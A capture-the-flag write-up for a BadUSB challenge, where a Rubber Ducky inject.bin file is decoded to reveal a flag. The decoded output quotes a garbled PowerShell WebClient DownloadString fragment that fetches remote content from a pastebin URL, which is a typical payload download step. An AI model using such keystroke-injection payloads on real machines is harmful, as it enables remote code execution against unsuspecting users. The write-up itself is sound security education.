# HID

## Task

One of my colleagues found a USB stick in the parking lot in front of our
company. Fortunately he handed it over directly to us . The drive contains an
SD card with just one file. Maybe it's no normal USB flash drive?

File: inject.bin

Tags: binary-analysis

## Solution

A USB device can be used as a HID (Human-Interface-Device). It looks like a
USB stick, but is actually a keyboard. This is called HID attack or BadUSB.

What you think you get: a filesystem.  
What you get: a keyboard that launches malicious commands to take over your
computer.

The tag is very misleading. This isn't binary analysis, we actually just need
to find the tool that was used to encode this keyboard inputs.

A very popular device is the Rubber Ducky.

`The USB Rubber Ducky injects keystrokes at superhuman speeds`

While researching I came across this very interesting post:
https://security.stackexchange.com/a/109595

It is definitely worth a read. There is also a link to a repository:
https://github.com/brandonlw/Psychson#running-demo-1-hid-payload

There is explained how to use the `Duckencoder` to encode the `Rubber Ducky
format`. There is also a link to a decoder:
https://github.com/midnitesnake/usb-rubber-ducky (forwarded from the google
url).

We can use the `Decode/ducky-decode.pl` script to decode the `inject.bin`.

```bash  
$ perl ducky-decode.pl -f inject.bin > decoded.txt  
```

In the decoded file we find a lot of errors, like `windowstzle`. The keyboard
layout is obviously wrong. We could fix that by changing the replacements in
the script, but let's look for the flag first.

After scrolling down a lot and filtering out noise we find this:

`N e t . W e b C l i e n t ( . D o w n l o a d S t r i n g * | h t t p s > & & p a s t e b i n . c o m & r a w & Y R D 8 j s v d | ( < @`

Now we just need to replace `Y` with `Z`, `>` with `:`, `&` with `/` and open
the correct url. Done.

Original writeup (https://github.com/klassiker/ctf-
writeups/blob/master/2020/syskron/hid.md).